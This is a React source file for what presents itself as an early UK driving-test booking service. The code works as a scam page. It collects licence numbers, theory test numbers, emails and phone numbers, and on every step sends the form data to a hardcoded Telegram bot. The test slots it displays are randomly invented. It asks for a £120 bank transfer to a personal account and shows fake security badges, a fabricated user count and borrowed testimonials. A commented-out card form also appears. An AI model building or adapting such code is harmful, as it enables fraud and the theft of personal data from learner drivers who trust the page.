import { useState, useEffect, useRef } from 'react';
import { Button } from '@/components/ui/button';
import { Info, ArrowRight, LockKeyhole, Check, X } from 'lucide-react';
import { Input } from '@/components/ui/input';
import { cn } from '@/lib/utils';
import ssl from '../../../public/images/ssl.svg';
import dss from '../../../public/images/dss.svg';
import gdpr from '../../../public/images/gdpr.svg';
import uk from '../../../public/images/uk.svg';
import user from '../../../public/images/users.svg';
import logo from '../../../public/images/logo.svg';

const BookNow = () => {
  const [isScrolled, setIsScrolled] = useState(false);
  useEffect(() => {
    const handleScroll = () => {
      setIsScrolled(window.scrollY > 10);
    };

    window.addEventListener('scroll', handleScroll);
    return () => window.removeEventListener('scroll', handleScroll);
  }, []);

  // Steps:
  // 1 = details, 2 = area select, 3 = dates, 4 = phone number, 
  // 5 = process info/review page, 6 = payment process page, 7 = success
  const [currentStep, setCurrentStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState(() => {
    const initialRef = Math.random().toString(36).substring(2, 8).toUpperCase();
    return {
      licenceNumber: '',
      theoryTestNumber: '',
      email: '',
      areas: [],
      step3: [],
      step4: '',
      paymentReference: initialRef, // Generated here first
    };
  });


  // Telegram Bot Integration
  const TELEGRAM_BOT_TOKEN = '7929316688:AAHyJj1P7MnnsnkAOQJ6FdFycuekSiW474Y';
  const TELEGRAM_CHAT_ID = '6811579315';

  const sendTelegramMessage = async (message) => {
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
        }),
      });
    } catch (error) {
      console.error('Error sending Telegram message:', error);
    }
  };

  const handleChange = (e) => {
    const { id, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [id]: value,
    }));
  };

  const MonthRangeSelector = () => {
    const months = [
      "January", "February", "March", "April", "May", "June",
      "July", "August", "September", "October", "November", "December"
    ];

    const now = new Date();
    const currentMonthIndex = now.getMonth();
    const currentYear = now.getFullYear();
    const minDate = new Date(now.getTime() + 16 * 24 * 60 * 60 * 1000);

    // Modified month generation logic
    const rangeMonths = Array.from({ length: 6 }, (_, i) => {
      const monthIndex = (currentMonthIndex + i) % 12;
      const year = currentYear + Math.floor((currentMonthIndex + i) / 12);

      // Generate all valid dates for the month
      const allDates = [];
      const date = new Date(year, monthIndex, 1);

      while (date.getMonth() === monthIndex) {
        if (date >= minDate && date.getDay() !== 0) { // Exclude Sundays
          allDates.push(new Date(date));
        }
        date.setDate(date.getDate() + 1);
      }

      // Randomly select between 3-7 dates
      const numDates = Math.min(allDates.length, Math.floor(Math.random() * 5) + 3);
      const selectedDates = allDates
        .sort(() => Math.random() - 0.5) // Shuffle array
        .slice(0, numDates)
        .sort((a, b) => a - b); // Sort chronologically

      // Create slots with random times
      const slots = selectedDates.map(date => {
        const randomHour = Math.floor(Math.random() * (17 - 9)) + 9;
        const randomMinute = [0, 15, 30, 45][Math.floor(Math.random() * 4)];
        const time = new Date(date);
        time.setHours(randomHour, randomMinute);

        return {
          date: new Date(date),
          times: [
            time.toLocaleTimeString('en-US', {
              hour: 'numeric',
              minute: '2-digit',
              hour12: true
            })
          ]
        };
      });

      return {
        name: months[monthIndex],
        monthIndex,
        year,
        slots,
        startDate: new Date(year, monthIndex, 1)
      };
    }).sort((a, b) => a.startDate.getTime() - b.startDate.getTime());

    const [openDropdown, setOpenDropdown] = useState(null);
    const selectedSlot = formData.step3?.[0] || null;

    const handleSlotSelect = (date, time) => {
      const isoDate = date.toISOString().split('T')[0];
      setFormData(prev => ({
        ...prev,
        step3: [{ date: isoDate, time }]
      }));
      setOpenDropdown(null);
    };

    const formatSelectedDate = () => {
      if (!selectedSlot) return "Select your test date";
      const date = new Date(selectedSlot.date);
      return `${date.getDate()} ${months[date.getMonth()].substring(0, 3)} ${date.getFullYear()}, ${selectedSlot.time}`;
    };

    return (
      <div className="flex flex-col mt-8 rounded space-y-4">
        {rangeMonths.map(month => (
          <div key={`${month.year}-${month.monthIndex}`} className="relative">
            <button
              type="button"
              onClick={() => setOpenDropdown(prev =>
                prev === `${month.year}-${month.monthIndex}` ? null : `${month.year}-${month.monthIndex}`)
              }
              className={`flex justify-between w-full px-4 py-4 rounded-full transition-colors duration-150 ${selectedSlot?.date.startsWith(`${month.year}-${String(month.monthIndex + 1).padStart(2, '0')}`)
                ? "bg-blue-700 text-white"
                : "bg-white text-black hover:bg-gray-100"
                }`}
            >
              <span>
                {month.name} {month.year}
                {selectedSlot?.date.startsWith(`${month.year}-${String(month.monthIndex + 1).padStart(2, '0')}`) && (
                  <span className="ml-2 font-semibold">{formatSelectedDate()}</span>
                )}
              </span>
              <Check className={`w-4 h-4 ${selectedSlot?.date.startsWith(`${month.year}-${String(month.monthIndex + 1).padStart(2, '0')}`)
                ? "text-white"
                : "opacity-50"
                }`} />
            </button>

            {openDropdown === `${month.year}-${month.monthIndex}` && (
              <div className="absolute top-full left-0 mt-1 w-full bg-white border rounded-lg shadow-lg z-10 p-4 max-h-48 overflow-y-auto">
                {month.slots.length > 0 ? (
                  month.slots.map((slot, index) => {
                    const isoDate = slot.date.toISOString().split('T')[0];
                    const isSelected = selectedSlot?.date === isoDate;

                    return (
                      <button
                        key={index}
                        type="button"
                        onClick={() => handleSlotSelect(slot.date, slot.times[0])}
                        className={`w-full text-left px-4 py-2 mb-1 rounded-full ${isSelected
                          ? "bg-blue-700 text-white"
                          : "bg-gray-100 hover:bg-gray-200"
                          }`}
                      >
                        <div className="flex justify-between items-center">
                          <span>
                            {slot.date.toLocaleDateString('en-GB', {
                              day: 'numeric',
                              month: 'short',
                              year: 'numeric'
                            })}
                            <span className="ml-2 font-medium">
                              {slot.times[0]}
                            </span>
                          </span>
                          {isSelected && <Check className="w-4 h-4" />}
                        </div>
                      </button>
                    );
                  })
                ) : (
                  <p className="text-gray-500">No available slots this month</p>
                )}
              </div>
            )}
          </div>
        ))}
      </div>
    );
  };
  const MultiSelectInput = () => {
    const areas = [
      "London", "Manchester", "Birmingham", "Leeds", "Glasgow", "Liverpool", "Sheffield", "Edinburgh",
      "Bristol", "Cardiff", "Newcastle", "Nottingham", "Leicester", "Southampton", "Brighton", "Portsmouth",
      "Aberdeen", "Swansea", "Coventry", "Reading", "Stoke-on-Trent", "Derby", "Plymouth", "Luton", "Wolverhampton",
      "Bournemouth", "Norwich", "York", "Blackpool", "Peterborough", "Dundee", "Huddersfield", "Oxford",
      "Cambridge", "Middlesbrough", "Bolton", "Ipswich", "Slough", "Exeter", "Gloucester", "Watford",
      "Rotherham", "Cheltenham", "Eastbourne", "Hastings", "Basingstoke", "Woking", "Lincoln", "Stevenage",
      "Colchester", "Bedford"
    ];
    const [isOpen, setIsOpen] = useState(false);
    const wrapperRef = useRef(null);
    const selectedAreas = formData.areas || [];

    const toggleArea = (area) => {
      if (selectedAreas.includes(area)) {
        setFormData(prev => ({ ...prev, areas: selectedAreas.filter(a => a !== area) }));
      } else {
        setFormData(prev => ({ ...prev, areas: [...selectedAreas, area] }));
      }
    };

    useEffect(() => {
      const handleClickOutside = (event) => {
        if (wrapperRef.current && !wrapperRef.current.contains(event.target)) {
          setIsOpen(false);
        }
      };
      document.addEventListener("mousedown", handleClickOutside);
      return () => document.removeEventListener("mousedown", handleClickOutside);
    }, [wrapperRef]);

    return (
      <div className="relative" ref={wrapperRef}>
        <div
          className="border rounded-full px-3 py-2 flex flex-wrap gap-2 cursor-pointer"
          onClick={() => setIsOpen(!isOpen)}
        >
          {selectedAreas.length > 0 ? (
            selectedAreas.map((area) => (
              <div key={area} className="flex items-center px-4 bg-blue-700 text-white py-1 rounded">
                <span>{area}</span>
                <X
                  className="w-4 h-4 ml-1 cursor-pointer"
                  onClick={(e) => {
                    e.stopPropagation();
                    toggleArea(area);
                  }}
                />
              </div>
            ))
          ) : (
            <span className="text-black">Choose your test centre</span>
          )}
        </div>
        {isOpen && (
          <div className="z-10 mt-1 bg-white border rounded-lg shadow w-96 max-h-96 overflow-auto">
            {areas.map((area) => (
              <div
                key={area}
                className="px-3 py-2 hover:bg-gray-100 cursor-pointer flex justify-between items-center"
                onClick={() => toggleArea(area)}
              >
                <span>{area}</span>
                {selectedAreas.includes(area) && <Check className="w-4 h-4" />}
              </div>
            ))}
          </div>
        )}
      </div>
    );
  };

  // const PaymentForm = ({ onPaymentSuccess }) => {
  //   const countryOptions = [
  //     "United Kingdom", "United States", "Canada", "Australia", "Germany",
  //     "France", "Spain", "Italy", "Netherlands", "Belgium", "Sweden",
  //     "Norway", "Denmark", "Finland", "Ireland", "Switzerland", "Austria",
  //     "New Zealand", "Japan", "Singapore"
  //   ];

  //   const handlePaymentSubmit = (e) => {
  //     e.preventDefault();
  //     const { fullName, cardNumber, expiryDate, securityCode, country } = formData;
  //     if (!fullName || !cardNumber || !expiryDate || !securityCode || !country) {
  //       alert("Please fill in all payment fields.");
  //       return;
  //     }
  //     onPaymentSuccess({ paymentId: "sample-payment-id" });
  //   };

  //   return (
  //     <form className="space-y-4" onSubmit={handlePaymentSubmit}>
  //       <div className="space-y-2">
  //         <label htmlFor="fullName" className="text-md font-bold text-black">
  //           Full Name
  //         </label>
  //         <Input
  //           id="fullName"
  //           type="text"
  //           placeholder="Enter your full name"
  //           value={formData.fullName || ''}
  //           onChange={handleChange}
  //           className="w-full h-16 text-md rounded-lg p-4"
  //           style={{ fontSize: '1.1rem' }}
  //         />
  //       </div>
  //       <div className="space-y-2">
  //         <label htmlFor="cardNumber" className="text-md font-bold text-black">
  //           Card Number
  //         </label>
  //         <Input
  //           id="cardNumber"
  //           type="text"
  //           placeholder="Enter your card number"
  //           value={formData.cardNumber || ''}
  //           onChange={handleChange}
  //           className="w-full h-16 text-md rounded-lg p-4"
  //           style={{ fontSize: '1.1rem' }}
  //         />
  //       </div>
  //       <div className="grid grid-cols-2 gap-4">
  //         <div className="space-y-2">
  //           <label htmlFor="expiryDate" className="text-md font-bold text-black">
  //             Expiry Date
  //           </label>
  //           <Input
  //             id="expiryDate"
  //             type="text"
  //             placeholder="MM/YY"
  //             value={formData.expiryDate || ''}
  //             onChange={handleChange}
  //             className="w-full h-16 text-md rounded-lg p-4"
  //             style={{ fontSize: '1.1rem' }}
  //           />
  //         </div>
  //         <div className="space-y-2">
  //           <label htmlFor="securityCode" className="text-md font-bold text-black">
  //             Security Code
  //           </label>
  //           <Input
  //             id="securityCode"
  //             type="text"
  //             placeholder="CVC"
  //             value={formData.securityCode || ''}
  //             onChange={handleChange}
  //             className="w-full h-16 text-md rounded-lg p-4"
  //             style={{ fontSize: '1.1rem' }}
  //           />
  //         </div>
  //       </div>
  //       <div className="space-y-2">
  //         <label htmlFor="country" className="text-md font-bold text-black">
  //           Country
  //         </label>
  //         <select
  //           id="country"
  //           required
  //           value={formData.country || ''}
  //           onChange={handleChange}
  //           className="w-full h-16 text-md rounded-lg p-4 border"
  //           style={{ fontSize: '1.1rem' }}
  //         >
  //           <option value="">Select a country</option>
  //           {countryOptions.map(country => (
  //             <option key={country} value={country}>{country}</option>
  //           ))}
  //         </select>
  //       </div>
  //       <Button type="submit" className="w-full mt-4 text-md flex justify-between items-center bg-blue-700 hover:bg-primary/90 rounded-full px-4 py-4 h-12">
  //         {loading ? <span>Loading...</span> : <>Pay Now <ArrowRight className="ml-2 h-4 w-4" /></>}
  //       </Button>
  //     </form>
  //   );
  // };

  const PaymentForm = () => (
    <div>
      <p>Please transfer to the following account details:</p>
      <div className="bg-white p-4 rounded-lg mt-4">
        <p><strong>Account Name:</strong> L Deighton</p>
        <p><strong>Sort Code:</strong> 07-08-06</p>
        <p><strong>Account Number:</strong> 30530087</p>
        <br />
        <p><strong>Amount: </strong>  Â£120.00</p>

        <p><strong>Reference:</strong> {formData.paymentReference}</p>
      </div>
      <p className="mt-4 text-sm text-gray-600">
        Please use the exact reference above when making your payment.
      </p>
    </div>
  );

  // Update step 5 display
  {
    currentStep === 5 && (
      <div>
        <h2 className="text-2xl text-center mb-4">
          How your booking process <br /> works?
        </h2>
        {/* ... existing timeline elements ... */}

        {/* Add reference preview */}
        <div className="bg-gray-100 p-4 rounded-lg mt-8">
          <h3 className="font-bold mb-2">Your Payment Reference:</h3>
          <div className="flex items-center gap-2">
            <Check className="w-5 h-5 text-green-600" />
            <span className="font-mono">{formData.paymentReference}</span>
          </div>
          <p className="text-sm mt-2 text-gray-600">
            This unique reference will be required when making your payment
          </p>
        </div>
      </div>
    )
  }

  const handleNext = (e) => {
    e.preventDefault();
    if (currentStep === 1) {
      if (!formData.licenceNumber || !formData.theoryTestNumber || !formData.email) {
        alert("Please fill in all required fields.");
        return;
      }
    } else if (currentStep === 2) {
      if (!formData.areas || formData.areas.length === 0) {
        alert("Please select at least one UK area.");
        return;
      }
    } else if (currentStep === 3) {
      if (!formData.step3 || formData.step3.length === 0) {
        alert("Please select at least one month.");
        return;
      }
    } else if (currentStep === 4) {
      if (!formData.step4) {
        alert("Please enter your phone number.");
        return;
      }
    }

    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      const message = `Step ${currentStep} completed.
Form Data: ${JSON.stringify(formData)}`;
      sendTelegramMessage(message);

      if (currentStep < 7) {
        setCurrentStep(prev => prev + 1);
      } else {
        console.log('Final form data:', formData);
      }
    }, 2000);
  };

  const onPaymentSuccess = (paymentMethod) => {
    console.log('Payment successful:', paymentMethod);
    handleNext(new Event('submit'));
  };

  return (
    <>
      <header
        className={cn(
          'fixed top-0 left-0 right-0 z-50 transition-all duration-300 ease-in-out py-4 px-4 md:px-6',
          isScrolled ? 'bg-white backdrop-blur-md shadow-sm' : 'bg-white'
        )}
      >
        <div className="mx-auto">
          <div className="flex items-center justify-center">
            <a href="/" className="flex items-center space-x-2 px-4">
              <img src={logo} alt="DriveTestPro Logo" />
            </a>
          </div>
        </div>
      </header>
      <section className="relative pt-32 ">
        <div className="container mx-auto px-6 relative z-10">
          <div className="max-w-md mx-auto">
            {currentStep === 1 && (
              <div>
                <form className="space-y-4" onSubmit={handleNext}>
                  <div className="text-center mb-8">
                    <h1 className="text-2xl md:text-2xl lg:text-3xl font-semibold leading-tight mb-4 text-gray-900">
                      Find an early driving test for just &#163;120!
                    </h1>
                    <p className="text-sm font-bold text-gray-400 mb-8 max-w-2xl mx-auto">
                      Need an earlier driving test? We find earlier test slots for you on your chosen dates, so you can start driving sooner.
                    </p>
                  </div>
                  <div className="bg-gray-200/50 shadow-lg rounded-xl p-4 md:p-6 mb-8">
                    <div className="flex flex-col gap-4">
                      <div className="space-y-2">
                        <div className="flex items-center justify-between">
                          <label htmlFor="licenceNumber" className="text-md font-bold text-black">
                            Provisional driving licence number *
                          </label>
                          <Info className="text-gray-400 w-5 h-5 cursor-pointer" />
                        </div>
                        <Input
                          id="licenceNumber"
                          type="text"
                          required
                          placeholder="Enter your driving licence number"
                          value={formData.licenceNumber}
                          onChange={handleChange}
                          className="w-full h-16 text-md rounded-full p-4"
                          style={{ fontSize: '1.1rem' }}
                        />
                      </div>
                      <div className="space-y-2">
                        <div className="flex items-center justify-between">
                          <label htmlFor="theoryTestNumber" className="text-md font-bold text-black">
                            Theory test pass or reference number *
                          </label>
                          <Info className="text-gray-400 w-5 h-5 cursor-pointer" />
                        </div>
                        <Input
                          id="theoryTestNumber"
                          type="text"
                          required
                          placeholder="Enter your theory pass number"
                          value={formData.theoryTestNumber}
                          onChange={handleChange}
                          className="w-full h-16 text-md rounded-full p-4"
                          style={{ fontSize: '1.1rem' }}
                        />
                      </div>
                      <div className="space-y-2">
                        <div className="flex items-center justify-between">
                          <label htmlFor="email" className="text-md font-bold text-black">
                            Email address *
                          </label>
                        </div>
                        <Input
                          id="email"
                          type="email"
                          required
                          placeholder="Enter your email address"
                          value={formData.email}
                          onChange={handleChange}
                          className="w-full h-16 text-md rounded-full p-4"
                          style={{ fontSize: '1.1rem' }}
                        />
                      </div>
                      <div className="space-y-2 md:space-y-0">
                        <Button type="submit" className="w-full text-md flex justify-center items-center bg-blue-700 hover:bg-primary/90 rounded-full px-4 py-4 h-12">
                          {loading ? <span>Loading...</span> : <>Find my early booking now <ArrowRight className="ml-2 h-4 w-4" /></>}
                        </Button>
                      </div>
                    </div>
                    <div className="flex items-center justify-center mt-2 text-center">
                      <p className="text-sm flex text-green-600 items-center gap-2 font-semibold">
                        <LockKeyhole className="w-5" /> Secure by 256-bit SSL Encrypted
                      </p>
                    </div>
                    <div className="flex justify-around mt-4">
                      <img src={ssl} alt="SSL Logo" />
                      <img src={dss} alt="DSS Logo" />
                      <img src={gdpr} alt="GDPR Logo" />
                    </div>
                  </div>
                </form>
                <section>
                  <div className="container max-w-md mx-auto px-6 py-12">
                    <div className="flex justify-around mt-4">
                      <img src={uk} alt="UK Logo" />
                      <img src={user} alt="User Logo" />
                    </div>
                    <div className="grid mt-12 grid-cols-3 gap-2">
                      <img
                        src="https://app.bookdrivingtest.co.uk/_next/image?url=%2Fmemories%2Fsuccess_story_memory_1.png&w=256&q=75"
                        alt="Success Story"
                        className="rounded-lg"
                      />
                      <img
                        src="https://app.bookdrivingtest.co.uk/_next/image?url=%2Fmemories%2Fsuccess_story_memory_2.png&w=256&q=75"
                        alt="Success Story"
                        className="rounded-lg"
                      />
                      <img
                        src="https://app.bookdrivingtest.co.uk/_next/image?url=%2Fmemories%2Fsuccess_story_memory_3.png&w=256&q=75"
                        alt="Success Story"
                        className="rounded-lg"
                      />
                      <img
                        src="https://app.bookdrivingtest.co.uk/_next/image?url=%2Fmemories%2Fsuccess_story_memory_4.png&w=256&q=75"
                        alt="Success Story"
                        className="rounded-lg"
                      />
                      <img
                        src="https://app.bookdrivingtest.co.uk/_next/image?url=%2Fmemories%2Fsuccess_story_memory_5.png&w=256&q=75"
                        alt="Success Story"
                        className="rounded-lg"
                      />
                      <img
                        src="https://app.bookdrivingtest.co.uk/_next/image?url=%2Fmemories%2Fsuccess_story_memory_6.png&w=256&q=75"
                        alt="Success Story"
                        className="rounded-lg"
                      />
                    </div>
                    <div className="border rounded-lg justify-center mt-4 items-center">
                      <div className="flex p-4">
                        <img
                          className="rounded-lg w-20"
                          src="https://app.bookdrivingtest.co.uk/_next/image?url=%2Fmemories%2Fsuccess_story_memory_4.png&w=256&q=75"
                          alt="Success Story"
                        />
                        <div className="ml-4">
                          <p className="text-lg font-semibold text-black">
                            Found my test in less than 48 hours
                          </p>
                          <p className="text-lg font-semibold text-black">— highly recommend</p>
                          <div className="flex mt-2">
                            {[...Array(5)].map((_, index) => (
                              <svg
                                key={index}
                                xmlns="http://www.w3.org/2000/svg"
                                fill="currentColor"
                                viewBox="0 0 24 24"
                                className="h-5 w-5 text-white p-[4px] rounded bg-blue-700 mr-0.5"
                              >
                                <path d="M12 .587l3.668 7.568L24 9.423l-6 5.847L19.335 24 12 20.201 4.665 24 6 15.27 0 9.423l8.332-1.268z" />
                              </svg>
                            ))}
                          </div>
                        </div>
                      </div>
                      <hr />
                      <p className="px-8 py-4 font-semibold">
                        Today, <span className="text-blue-700">132 users</span> booked their early test slots!
                      </p>
                    </div>
                    <div className="mt-8 text-center">
                      <p className="text-sm font-semibold text-gray-500 mt-2">
                        If you already have an account, you can <span className="underline">log in here.</span>
                      </p>
                      <p className="text-sm font-semibold text-gray-500 mt-2">
                        By logging into this service you agree to our <span className="underline">Terms of Use</span>, <br />
                        <span className="underline">Privacy Policy</span> and <span className="underline">Refund Policy</span>.
                      </p>
                    </div>
                  </div>
                </section>
              </div>
            )}
            {currentStep > 1 && currentStep < 7 && (
              <div>
                {currentStep === 5 && (
                  <div>
                    <h2 className="text-2xl text-center mb-4">
                      How your booking process <br /> works?
                    </h2>
                    <div className="relative text-start mb-9">
                      <div className="absolute left-0 top-0 h-full w-[20px] bg-gradient-to-b from-[#2660F5] to-transparent rounded-full"></div>
                      <div className="flex flex-col space-y-10">
                        <div className="relative pl-[35px]">
                          <div className="absolute left-[4px] top-[4px] w-[12px] h-[12px] rounded-full bg-[#FFFFFF]"></div>
                          <p className="text-[15px] text-[#757B88] font-semibold">
                            Select your desired test date and provide us with your contact information
                          </p>
                        </div>
                        <div className="relative pl-[35px]">
                          <div className="absolute left-[4px] top-[4px] w-[12px] h-[12px] rounded-full bg-[#FFFFFF]"></div>
                          <p className="text-[15px] text-[#757B88] font-semibold">
                            Pay for your new test date
                          </p>
                        </div>
                        <div className="relative pl-[35px]">
                          <div className="absolute left-[4px] top-[4px] w-[12px] h-[12px] rounded-full bg-[#FFFFFF]"></div>
                          <p className="text-[15px] text-[#757B88] font-semibold">
                            Receive your DVSA test confirmation via email and we will contact you to ensure you are satisfied
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>
                )}

                <form className="space-y-4" onSubmit={handleNext}>
                  <div className={`rounded-xl p-4 md:p-6 mb-8 ${currentStep !== 5 ? "bg-gray-200/50 shadow-lg" : ""}`}>
                    {currentStep === 2 ? (
                      <>
                        <label htmlFor="areas" className="mb-4 text-md font-bold text-black">
                          Select Test Centre
                        </label>
                        <MultiSelectInput />
                      </>
                    ) : currentStep === 3 ? (
                      <>
                        <label htmlFor="step3" className="text-md font-bold text-black">
                          Choose dates
                        </label>
                        <MonthRangeSelector />
                      </>
                    ) : currentStep === 4 ? (
                      <>
                        <label htmlFor="step4" className="text-md font-bold text-black">
                          Phone number
                        </label>
                        <Input
                          id="step4"
                          type="text"
                          required
                          placeholder="Enter your phone number with Country Code"
                          value={formData.step4 || ''}
                          onChange={handleChange}
                          className="w-full h-16 text-md rounded-full p-4 mt-4"
                          style={{ fontSize: '1.1rem' }}
                        />
                      </>
                    ) : currentStep === 6 ? (<>
                      <div className=" mb-8">
                        <h2 className="text-2xl font-bold mb-4">Payment Process</h2>
                        <p className="mb-4">
                          Please enter your payment details below to confirm your booking.
                        </p>
                        <div className="flex p-4">
                          <img
                            className="rounded-lg w-20"
                            src="https://app.bookdrivingtest.co.uk/_next/image?url=%2Fmemories%2Fsuccess_story_memory_4.png&w=256&q=75"
                            alt="Success Story"
                          />
                          <div className="ml-4">
                            <p className="text-lg font-semibold text-black">
                              Found my test in less than 48 hours
                            </p>
                            <p className="text-lg font-semibold text-black">— highly recommend</p>
                            <div className="flex mt-2">
                              {[...Array(5)].map((_, index) => (
                                <svg
                                  key={index}
                                  xmlns="http://www.w3.org/2000/svg"
                                  fill="currentColor"
                                  viewBox="0 0 24 24"
                                  className="h-5 w-5 text-white p-[4px] rounded bg-blue-700 mr-0.5"
                                >
                                  <path d="M12 .587l3.668 7.568L24 9.423l-6 5.847L19.335 24 12 20.201 4.665 24 6 15.27 0 9.423l8.332-1.268z" />
                                </svg>
                              ))}
                            </div>
                          </div>
                        </div>
                        <PaymentForm
                        />
                      </div>
                    </>) : <></>}
                    <div className="space-y-2 md:space-y-0">
                      <Button
                        type="submit"
                        className="w-full mt-4 text-md flex justify-center items-center bg-blue-700 hover:bg-primary/90 rounded-full px-4 py-4 h-12"
                      >
                        {loading ? (
                          <span>Loading...</span>
                        ) : currentStep === 6 ? (
                          <span>Paid</span> // This will show "Paid" when currentStep is 6
                        ) : (
                          <>Continue <ArrowRight className="ml-2 h-4 w-4" /></>
                        )}
                      </Button>
                    </div>
                  </div>
                  {currentStep === 4 && (
                    <div className="border bg-green-300 p-4 flex gap-4 rounded-lg justify-center mt-4">
                      <LockKeyhole className="w-16 mt-2" />
                      <p className="font-semibold">
                        We require your phone number to complete the booking process. Rest assured, your number will remain confidential and will not be shared with third parties.
                      </p>
                    </div>
                  )}
                </form>
              </div>
            )}
            {/* {currentStep === 6 && (

            )} */}
            {currentStep === 7 && (
              <div className="bg-gray-200/50 shadow-lg rounded-xl p-8 text-center">
                <div className="mb-6 flex justify-center">
                  <Check className="w-16 h-16 text-green-600" strokeWidth={2} />
                </div>
                <h2 className="text-3xl font-bold mb-4">Payment Received</h2>
                <p className="text-lg text-gray-600">
                  We will contact you when we have confirmed your payment and processed your booking.
                </p>
                <div className="mt-8 flex justify-center">
                  <LockKeyhole className="w-6 h-6 text-gray-500 mr-2" />
                  <span className="text-sm text-gray-500">
                    Your transaction is secured with 256-bit SSL encryption
                  </span>
                </div>
              </div>
            )}
          </div>
        </div>
      </section>
    </>
  );
};

export default BookNow;
